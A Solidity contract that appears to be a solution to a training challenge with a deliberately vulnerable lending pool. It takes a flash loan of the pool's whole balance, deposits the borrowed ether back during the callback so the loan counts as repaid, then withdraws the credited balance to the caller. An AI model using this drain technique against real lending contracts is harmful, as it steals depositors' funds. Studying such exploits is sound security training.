// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    using Address for address payable;
    SideEntranceLenderPool pool;

    constructor() {}

    function attack(SideEntranceLenderPool _pool) external {
        pool = _pool;
        pool.flashLoan(address(pool).balance);
    }

    function withdraw() external {
        pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
